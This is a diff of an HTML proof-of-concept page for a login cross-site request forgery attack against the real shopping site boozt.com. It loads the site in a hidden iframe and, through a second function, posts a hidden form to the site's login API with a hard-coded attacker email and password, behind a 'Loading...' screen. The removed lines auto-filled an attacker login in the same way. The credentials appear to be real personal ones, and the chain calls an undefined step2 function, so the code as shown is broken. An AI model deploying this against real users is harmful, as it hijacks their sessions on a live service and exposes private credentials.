@@ -1,27 +1,53 @@
+<!DOCTYPE html>
 <html>
-<body>
-    // Wait for the page to load fully
-window.onload = function() {
-    // Find the email and password fields
-    let emailField = document.querySelector('input[name="Email"]');
-    let passwordField = document.querySelector('input[name="Password"]');
-    
-    // Check if fields exist (avoid errors)
-    if (emailField && passwordField) {
-        // Enter the attacker's email and password
-        emailField.value = "attacker@example.com";
-        passwordField.value = "AttackerPassword123";
+<head>
+    <script>
+        function step1_visitMainPage() {
+            // Open Boozt.com's main page in an iframe (to set necessary cookies)
+            var iframe = document.createElement("iframe");
+            iframe.src = "https://www.boozt.com/login";
+            iframe.style.display = "none";
+            document.body.appendChild(iframe);
 
-        // Find and click the login button
-        let loginButton = document.querySelector('button[type="submit"]');
-        if (loginButton) {
-            loginButton.click();  // Automatically logs in
-        } else {
-            console.log("Login button not found.");
+            // Wait a few seconds, then proceed to login page
+            setTimeout(step2_visitLoginPage, 5000);
         }
-    } else {
-        console.log("Login fields not found.");
-    }
-};
+
+ 
+
+        function step3_submitLoginForm() {
+            var form = document.createElement("form");
+            form.method = "POST";
+            form.action = "https://www.boozt.com/api/login";
+
+            var email = document.createElement("input");
+            email.type = "hidden";
+            email.name = "email";
+            email.value = "iqbalup18@gmail.com"; // Attacker's email
+
+            var password = document.createElement("input");
+            password.type = "hidden";
+            password.name = "password";
+            password.value = "6115Isayevm"; // Attacker's password
+
+            var remember = document.createElement("input");
+            remember.type = "hidden";
+            remember.name = "remember_me";
+            remember.value = "true";
+
+            form.appendChild(email);
+            form.appendChild(password);
+            form.appendChild(remember);
+
+            document.body.appendChild(form);
+            form.submit();
+        }
+
+        // Start the full navigation process on page load
+        window.onload = step1_visitMainPage;
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
 </body>
 </html>
